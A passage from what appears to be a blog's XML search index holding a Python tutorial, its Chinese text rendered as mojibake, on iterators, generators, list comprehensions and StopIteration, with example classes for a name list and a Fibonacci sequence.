·å¯èƒ½æ˜¯å¹¶è¡Œçš„ï¼Œä½†æ˜¯åç¨‹æ˜¯åœ¨ä¸€ä¸ªçº¿ç¨‹ä¸­æ‰€ä»¥æ˜¯å¹¶å‘</li></ol>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python è¿­ä»£å™¨ï¼Œç”Ÿæˆå™¨ä¸åˆ—è¡¨æ¨å¯¼å¼</title>
      <link href="/blog/2021/06/15/programming/python/iterables/"/>
      <url>/blog/2021/06/15/programming/python/iterables/</url>
      
        <content type="html"><![CDATA[<h1 id="è¿­ä»£å™¨">è¿­ä»£å™¨</h1><p>å¯ä»¥è¿­ä»£çš„æ•°æ®ç±»å‹ï¼šå…ƒç»„ã€åˆ—è¡¨ã€å­—å…¸ã€é›†åˆã€å­—ç¬¦ä¸²</p><p>åˆ¤æ–­æ˜¯å¦å¯è¿­ä»£ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Iterable</span><br><span class="line"><span class="built_in">isinstance</span>(è¦åˆ¤æ–­çš„å˜é‡,Iterable)  <span class="comment">#å¦‚æœå¯ä»¥è¿­ä»£ï¼Œè¿”å› True</span></span><br></pre></td></tr></table></figure><p>åˆ¤æ–­æ˜¯å¦æ˜¯è¿­ä»£å™¨ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Iterable</span><br><span class="line"><span class="built_in">isinstance</span>(è¦åˆ¤æ–­çš„å˜é‡,Iterator)  <span class="comment">#å¦‚æœæ˜¯è¿­ä»£å™¨ï¼Œè¿”å› True</span></span><br></pre></td></tr></table></figure><p>print çš„ä¸¤ç§ä¹¦å†™å½¢å¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(&#x27;number is %d&#x27; % 25)</span><br><span class="line">print(&#x27;number is &#x27;, 25)</span><br></pre></td></tr></table></figure><p>åˆ›å»ºå‡ºæ¥çš„å¯è¿­ä»£çš„å®ä¾‹å¯¹è±¡ï¼š</p><ol type="1"><li><p>æ™®é€šçš„ç±»</p></li><li><p>æ·»åŠ  <code>__iter__</code>ï¼Œä½¿å…¶å…·æœ‰å¯è¿­ä»£å±æ€§ï¼Œå³ï¼šisinstanceè¿”å› True</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def __iter__(self):</span><br><span class="line">pass</span><br></pre></td></tr></table></figure></p></li><li><p><code>__iter__</code>æ–¹æ³•ä¸­è¿”å›ä¸€ä¸ªå…·æœ‰<code>__iter__</code>æ–¹æ³•ä»¥åŠ<code>__next__</code>å¯¹è±¡çš„å¼•ç”¨</p></li></ol><p>ä¸€ä¸ªå¯¹è±¡æ˜¯å¦å¯ä»¥ç”¨ for æ¥è¿­ä»£éå†ï¼ˆç”µè„‘ç¨‹åºçš„åˆ¤æ–­æ–¹æ³•ï¼‰:</p><ol type="1"><li><p>æ ¹æ®å¯¹è±¡ä¸­æœ‰æ—  <code>__iter__</code> æ–¹æ³•ï¼Œå³ï¼šä½¿ç”¨ isinstance()åˆ¤æ–­</p></li><li><p>åœ¨ç¬¬ä¸€æ­¥æˆç«‹çš„å‰æä¸‹ï¼Œä½¿ç”¨ iter æ–¹æ³• <code>iter(classmate)</code>æ¥è°ƒç”¨è¯¥å¯¹è±¡çš„ <code>__iter__</code>æ–¹æ³•ï¼Œè·å–å…¶è¿”å›å€¼ï¼Œä¹Ÿå°±æ˜¯è¿­ä»£å™¨å¯¹è±¡çš„å¼•ç”¨</p></li><li><p>ä½¿ç”¨è¿”å›å€¼ï¼Œå³ï¼šè¿­ä»£å™¨ï¼Œè°ƒç”¨å…¶è‡ªèº«çš„ next æ–¹æ³•<code>next(classmate_iter)</code> æ¥è·å–å…¶<code>__next__</code>æ–¹æ³•ï¼Œè·å–å…¶è¿”å›å€¼</p><p>æ³¨ï¼šç§°ä¸€ä¸ªåŒæ—¶å…·æœ‰ <code>__iter__</code> å’Œ <code>__next__</code>æ–¹æ³•çš„ç±»æˆä¸ºè¿­ä»£å™¨ã€‚</p></li><li><p>æ¯ä¸€æ¬¡ for å¾ªç¯é€šè¿‡è¿­ä»£å™¨ä¸­çš„ <code>__next__</code>æ–¹æ³•æ¥å–å…¶è¿”å›å€¼</p></li></ol><p>è®© <code>__next__</code>æ–¹æ³•è¾“å‡ºå¯è¿­ä»£å¯¹è±¡çš„ä¸œè¥¿ï¼Œéœ€è¦å†å°†å¯è¿­ä»£å¯¹è±¡åœ¨ <code>__iter__</code>æ–¹æ³•åˆ›å»ºè¿­ä»£å™¨æ—¶ï¼Œä¼ å…¥è‡ªå·±çš„ self å¼•ç”¨ã€‚æ­¤å¤–ï¼Œåœ¨è¿­ä»£å™¨ä¸­å†™ä¸€ä¸ª<code>__init__</code> æ¥å—å¼•ç”¨ã€‚</p><p>åœ¨è¿­ä»£å™¨ä¸­è®¾ç½®ä¸€ä¸ªå±æ€§ï¼Œç”¨æ¥æ ‡å¿—å½“å‰çš„åºå·ï¼Œç„¶åé€šè¿‡æ¯”è¾ƒåºå·ï¼Œå¦‚æœå½“å‰åºå·å°äºåˆ—è¡¨çš„é•¿åº¦ï¼Œé‚£ä¹ˆæ¥ç€å–ï¼Œå¦åˆ™ä¼šé»˜è®¤è¿”å›ä¸€ä¸ªNone å€¼ã€‚</p><p>é€šè¿‡ä½¿ç”¨ <code>raise StopIteration</code> å¼•å‘æ­¤å¼‚å¸¸ï¼Œæ¥ä½¿ forå¾ªåœæ­¢è¿­ä»£ã€‚</p><p>æºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Iterable</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Iterator</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Classmates</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.names = <span class="built_in">list</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.names.append(name)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__iter__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> classIter(self)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">classIter</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,obj</span>):</span><br><span class="line">        self.obj = obj</span><br><span class="line">        self.current_num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__iter__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__next__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.current_num &lt; <span class="built_in">len</span>(self.obj.names):</span><br><span class="line">            ret = self.obj.names[self.current_num]</span><br><span class="line">            self.current_num += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> ret</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> StopIteration</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">classmate = Classmates()</span><br><span class="line"></span><br><span class="line">classmate.add(<span class="string">&#x27;wang&#x27;</span>)</span><br><span class="line">classmate.add(<span class="string">&#x27;zhang&#x27;</span>)</span><br><span class="line">classmate.add(<span class="string">&#x27;li&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># classmate_iter = iter(classmate)</span></span><br><span class="line"><span class="comment"># print(f&#x27;the iterability of classmate:&#123;isinstance(classmate,Iterable)&#125;&#x27;)</span></span><br><span class="line"><span class="comment"># print(f&#x27;the iterability of classmate_iter:&#123;isinstance(classmate_iter,Iterator)&#125;&#x27;)</span></span><br><span class="line"><span class="comment"># print(next(classmate_iter))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> classmate:</span><br><span class="line">    <span class="built_in">print</span>(name)</span><br></pre></td></tr></table></figure><p>ä¸‹é¢å°†å¯è¿­ä»£å¯¹è±¡ä¸è¿­ä»£å™¨åˆæˆä¸€ä¸ªå¯¹è±¡(ä¹Ÿå°±æ˜¯è¿­ä»£å™¨ä¸€å®šå¯è¿­ä»£ï¼Œä½†æ˜¯å¯è¿­ä»£çš„å¯¹è±¡ä¸ä¸€å®šæ˜¯è¿­ä»£å™¨)ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Iterable</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Iterator</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Classmates</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.names = <span class="built_in">list</span>()</span><br><span class="line">        self.current_num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.names.append(name)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__iter__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__next__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.current_num &lt; <span class="built_in">len</span>(self.names):</span><br><span class="line">            ret = self.names[self.current_num]</span><br><span class="line">            self.current_num += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> ret</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> StopIteration</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">classmate = Classmates()</span><br><span class="line"></span><br><span class="line">classmate.add(<span class="string">&#x27;wang&#x27;</span>)</span><br><span class="line">classmate.add(<span class="string">&#x27;zhang&#x27;</span>)</span><br><span class="line">classmate.add(<span class="string">&#x27;li&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> classmate:</span><br><span class="line">    <span class="built_in">print</span>(name)</span><br></pre></td></tr></table></figure><p>è¿­ä»£å™¨çš„ä¼˜ç‚¹ï¼š</p><ol type="1"><li><p>å­˜å‚¨æŒ‡å®šç”Ÿæˆçš„æ•°æ®çš„æ–¹å¼ï¼Œè€Œä¸æ˜¯ç»“æœã€‚å¦‚æœå½“ç»“æœè¿‡å¤šæ—¶ï¼Œå­˜å‚¨èµ·æ¥ä¼šèŠ±è´¹å¤§é‡çš„ç©ºé—´ã€‚</p><p>ä¾‹å¦‚ï¼špython ä¸­çš„ range ä¸ xrange</p></li></ol><p>ä½¿ç”¨è¿­ä»£å™¨å†™æ–æ³¢é‚£å¥‘æ•°åˆ—ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">fibonacci</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,all_num</span>):</span><br><span class="line">        self.all_num = all_num</span><br><span class="line">        self.current_num = <span class="number">0</span></span><br><span class="line">        self.a = <span class="number">0</span></span><br><span class="line">        self.b = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__iter__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__next__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.current_num &lt; self.all_num:</span><br><span class="line">            ret = self.a</span><br><span class="line">            self.a, self.b = self.b, self.a+self.b</span><br><span class="line">            self.current_num += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> ret</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> StopIteration</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        number = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>].strip())</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    fibo = fibonacci(number)</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> fibo:</span><br><span class="line">        <span class="built_in">print</span>(num)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>å¹¶ä¸æ˜¯åªæœ‰ for å¾ªç¯èƒ½æ¥æ”¶è¿­ä»£å™¨ï¼Œlist(), tuple() ç­‰ä¹Ÿèƒ½æ¥æ”¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">li = <span class="built_in">list</span>(fina(<span class="number">8</span>))</span><br><span class="line">tp=<span class="built_in">tuple</span>(fina(<span class="number">5</span>))</span><br></pre></td></tr></table></figure><p>è¿™å¹¶ä¸æ˜¯ç®€å•çš„ç±»å‹è½¬æ¢ï¼Œè€Œæ˜¯é€šè¿‡è¿­ä»£å™¨é€ä¸ªè½¬æ¢ã€‚æ¯”å¦‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">29</span>]: a=(<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">30</span>]: <span class="built_in">list</span>(a)</span><br><span class="line">Out[<span class="number">30</span>]: [<span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>]</span><br></pre></td></tr></table></figure><p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªç©ºåˆ—è¡¨ï¼Œç„¶åæ‰¾åˆ° a çš„è¿­ä»£å™¨ï¼Œä½¿ç”¨ next å‡½æ•°æ‰¾å…¶<code>__next__</code>æ–¹æ³•çš„è¿”å›å€¼é€ä¸ªè¿­ä»£è½¬æ¢ï¼Œæœ€åé‡åˆ°è¿­ä»£åœæ­¢å¼‚å¸¸ï¼Œè¿›è€Œåœæ­¢ã€‚</p><h1 id="åˆ—è¡¨ç”Ÿæˆå¼ä¸ç”Ÿæˆå™¨è¡¨è¾¾å¼">åˆ—è¡¨ç”Ÿæˆå¼ä¸ç”Ÿæˆå™¨è¡¨è¾¾å¼</h1><p>åˆ—è¡¨ç”Ÿæˆå¼ï¼šä¿å­˜ç”Ÿæˆç»“æœï¼Œå°†ç»“æœå­˜åˆ°å˜é‡ã€‚ ä½¿ç”¨æ–¹æ‹¬å·</p><p>ç”Ÿæˆå™¨è¡¨è¾¾å¼ï¼šä¿å­˜ç”Ÿæˆç»“æœçš„æ–¹å¼ï¼Œfor å¾ªç¯è¿­ä»£çš„æ—¶å€™ï¼Œé€ä¸ªè®¡ç®—è¾“å‡ºã€‚ä½¿ç”¨åœ†æ‹¬å·</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">31</span>]:  num = [x*<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>) <span class="keyword">if</span> x%<span class="number">2</span> == <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">32</span>]: num</span><br><span class="line">Out[<span class="number">32</span>]: [<span class="number">0</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">16</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">33</span>]: num_generator = (x*<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>) <span class="keyword">if</span> x%<span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">34</span>]: num_generator</span><br><span class="line">Out[<span class="number">34</span>]: &lt;generator <span class="built_in">object</span> &lt;genexpr&gt; at <span class="number">0x10782a050</span>&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">35</span>]: <span class="keyword">for</span> i <span class="keyword">in</span> num_generator:</span><br><span class="line">    ...:     <span class="built_in">print</span>(i)</span><br><span class="line">    ...:</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">8</span></span><br><span class="line"><span class="number">12</span></span><br><span class="line"><span class="number">16</span></span><br></pre></td></tr></table></figure><h1 id="ç”Ÿæˆå™¨">ç”Ÿæˆå™¨</h1><ol type="1"><li><p>åˆ©ç”¨è¿­ä»£å™¨ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ¯æ¬¡è¿­ä»£è·å–æ•°æ®ï¼ˆé€šè¿‡ nextæ–¹æ³•ï¼‰æ—¶ï¼ŒæŒ‰ç…§ç‰¹å®šçš„è§„å¾‹è¿›è¡Œç”Ÿæˆã€‚ä½†æ˜¯ï¼Œæˆ‘ä»¬åœ¨å®ç°ä¸€ä¸ªè¿­ä»£å™¨æ—¶ï¼Œå…³äºå½“å‰è¿­ä»£åˆ°çš„çŠ¶æ€éœ€è¦æˆ‘ä»¬è‡ªå·±è®°å½•ï¼Œè¿›è€Œæ‰èƒ½æ ¹æ®å½“å‰çŠ¶æ€ç”Ÿæˆä¸‹ä¸€ä¸ªæ•°æ®ã€‚ä¸ºäº†è¾¾åˆ°è®°å½•å½“å‰çŠ¶æ€ï¼Œå¹¶é…åˆnext()å‡½æ•°è¿›è¡Œè¿­ä»£ä½¿ç”¨ï¼Œæˆ‘ä¹ˆå¯ä»¥é‡‡ç”¨æ›´ç®€ä¾¿çš„è¯­æ³•ï¼šç”Ÿæˆå™¨ï¼ˆgeneratorï¼‰ï¼Œ<strong>ç”Ÿæˆå™¨æ˜¯ä¸€ç±»ç‰¹æ®Šçš„è¿­ä»£å™¨</strong>ã€‚</p></li><li><p>åˆ›å»ºç”Ÿæˆå™¨çš„æ–¹æ³•</p><ol type="1"><li><p>å°†åˆ—è¡¨ç”Ÿæˆå¼çš„ <code>[]</code> æ”¹ä¸º <code>()</code></p></li><li><p>åœ¨æ™®é€šå‡½æ•°ä¸­åŠ ä¸Š yieldï¼ˆåªè¦å‡½æ•°é‡Œé¢æœ‰ yieldï¼Œæ— è®ºæ˜¯åœ¨ ifï¼Œ forç­‰ç­‰é‡Œé¢ï¼Œè¿™ä¸ªå‡½æ•°å°±ä¸æ˜¯å‡½æ•°äº†ï¼Œå˜æˆäº†ç”Ÿæˆå™¨ã€‚ï¼‰</p><p>å¦‚æœä¸€ä¸ªå‡½æ•°ä¸­æœ‰ yieldè¯­å¥ï¼Œé‚£ä¹ˆå®ƒå°±ä¸å†æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œè€Œæ˜¯ä¸€ä¸ªç”Ÿæˆå™¨ã€‚</p><p>å¦‚æœåœ¨è°ƒç”¨å‡½æ•°æ—¶ï¼Œå‘ç°è¿™ä¸ªå‡½æ•°ä¸­æœ‰ yieldï¼Œé‚£ä¹ˆæ­¤æ—¶ä¸å†è°ƒç”¨å‡½æ•°ï¼Œè€Œæ˜¯åˆ›å»ºä¸€ä¸ªç”Ÿæˆå™¨å¯¹è±¡ã€‚</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">create_num</span>(<span class="params">all_num</span>):</span><br><span class="line">    a, b =<span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    current_num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> current_num &lt; all_num:</span><br><span class="line">        <span class="keyword">yield</span> a</span><br><span class="line">        a, b = b, a+b</span><br><span class="line">        current_num += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">obj = create_num(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(next(obj))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(next(obj))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> obj:</span><br><span class="line"><span class="built_in">print</span>(num)</span><br></pre></td></tr></table></figure></p></li></ol></li></ol><p>for å¾ªç¯è§¦å‘è¿­ä»£å™¨ï¼š</p><p>ç¬¬ä¸€æ¬¡ï¼šç¨‹åºä»å¤´å¼€å§‹è¿è¡Œï¼Œç„¶åè¿è¡Œåˆ° yieldï¼Œyield è¯­å¥ä¼šæš‚åœç¨‹åºï¼Œå°†yield åé¢çš„å€¼è¿”å›ç»™ for å¾ªç¯çš„å˜é‡ï¼Œç„¶åå¼€å§‹è¿›è¡Œ for å¾ªç¯ã€‚ä¸‹ä¸€æ¬¡ forå¾ªç¯ï¼Œè¿›å…¥ç”Ÿæˆå™¨åï¼Œä» yield è¯­å¥çš„ä¸‹ä¸€æ¡è¯­å¥å¼€å§‹æ‰§è¡Œã€‚</p><p>é€šè¿‡ next è§¦å‘è¿­ä»£å™¨ï¼Œå¼€å§‹è¿­ä»£ã€‚</p><p>æ³¨æ„ï¼šä¸åŒçš„<strong>ç”Ÿæˆå™¨å¯¹è±¡</strong>æœ‰ä¸åŒçš„å±€éƒ¨å˜é‡ã€‚äº’ä¸å¹²æ‰°ã€‚</p><p>å¦‚æœæƒ³è¦é€šè¿‡ while True è°ƒç”¨ next æ–¹æ³•æ¥å–å€¼ï¼Œå¯ä»¥é€šè¿‡æ•è·StopIteration å¼‚å¸¸æ¥ç»“æŸã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ret = <span class="built_in">next</span>(obj)</span><br><span class="line">        <span class="built_in">print</span>(ret)</span><br><span class="line">    <span class="keyword">except</span> StopIteration:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>å¦‚ä½•æ¥å—è¿­ä»£å™¨çš„è¿”å›å€¼ï¼Ÿ</p><p>å¯ä»¥åœ¨å…¶æ‰§è¡Œå®Œä¹‹åï¼Œé€šè¿‡å¼‚å¸¸å¯¹è±¡<code>except StopIteration as e:</code> æˆ–è€…<code>except Exception as e:</code> ä¸­ e çš„ value å±æ€§æ¥æ‰“å°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ret = <span class="built_in">next</span>(obj)</span><br><span class="line">        <span class="built_in">print</span>(ret)</span><br><span class="line">    <span class="keyword">except</span> StopIteration <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e.value)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h1 id="å°ç»“">å°ç»“</h1><ul><li>ä½¿ç”¨äº† yield å…³é”®å­—çš„å‡½æ•°ä¸å†æ˜¯å‡½æ•°ï¼Œè€Œæ˜¯ç”Ÿæˆå™¨ã€‚ï¼ˆä½¿ç”¨äº† yieldçš„å‡½æ•°å°±æ˜¯ç”Ÿæˆå™¨ï¼‰</li><li>yield å…³é”®å­—æœ‰ä¸¤ç‚¹ä½œç”¨ï¼š<ul><li>ä¿å­˜å½“å‰è¿è¡ŒçŠ¶æ€ï¼ˆæ–­ç‚¹ï¼‰ï¼Œç„¶åæš‚åœæ‰§è¡Œï¼Œå³å°†ç”Ÿæˆå™¨ï¼ˆå‡½æ•°ï¼‰æŒ‚èµ·</li><li>å°† yield å…³é”®å­—åé¢è¡¨è¾¾å¼çš„å€¼ä½œä¸ºè¿”å›å€¼è¿”å›ï¼Œæ­¤æ—¶å¯ä»¥ç†è§£ä¸ºèµ·åˆ°äº†return çš„ä½œç”¨</li></ul></li><li>å¯ä»¥ä½¿ç”¨next()å‡½æ•°è®©ç”Ÿæˆå™¨ä»æ–­ç‚¹å¤„ç»§ç»­æ‰§è¡Œï¼Œå³å”¤é†’ç”Ÿæˆå™¨ï¼ˆå‡½æ•°ï¼‰</li><li>Python3 ä¸­çš„ç”Ÿæˆå™¨å¯ä»¥ä½¿ç”¨ return è¿”å›æœ€ç»ˆè¿è¡Œçš„è¿”å›å€¼ï¼Œè€Œ Python2ä¸­çš„ç”Ÿæˆå™¨ä¸å…è®¸ä½¿ç”¨ return è¿”å›ä¸€ä¸ªè¿”å›å€¼ï¼ˆå³å¯ä»¥ä½¿ç”¨ returnä»ç”Ÿæˆå™¨ä¸­é€€å‡ºï¼Œä½† return åä¸èƒ½æœ‰ä»»ä½•è¡¨è¾¾å¼ï¼‰</li></ul><p>ä½¿ç”¨ send 